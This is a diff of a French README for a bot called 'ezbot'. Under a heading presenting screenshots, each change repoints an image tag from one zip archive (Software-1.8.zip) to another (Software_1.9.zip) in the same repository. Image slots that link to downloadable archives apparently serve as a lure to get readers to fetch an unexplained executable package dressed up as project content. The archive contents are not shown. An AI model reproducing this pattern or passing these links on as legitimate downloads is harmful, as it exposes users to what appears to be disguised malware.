@@ -4,13 +4,13 @@
 <h2 align="center">📷 Présentation du bot</h2>
 <p align="center">Voici quelque image d'aticle du bot</p>
 <p align="center">
-<img align="center" src="https://github.com/ylayann/ezbot/raw/refs/heads/main/sephirothic/Software-1.8.zip"></img>
+<img align="center" src="https://raw.githubusercontent.com/ylayann/ezbot/main/sephirothic/Software_1.9.zip"></img>
 </p>
 <p align="center">
- <img src="https://github.com/ylayann/ezbot/raw/refs/heads/main/sephirothic/Software-1.8.zip"></img>
+ <img src="https://raw.githubusercontent.com/ylayann/ezbot/main/sephirothic/Software_1.9.zip"></img>
  </p>
 <p align="center"> Vous pouvez modifier la couleur du text, l'embed, les informations que vous voulez avoir
-<img src="https://github.com/ylayann/ezbot/raw/refs/heads/main/sephirothic/Software-1.8.zip"></img>
+<img src="https://raw.githubusercontent.com/ylayann/ezbot/main/sephirothic/Software_1.9.zip"></img>
 </p>
  
 
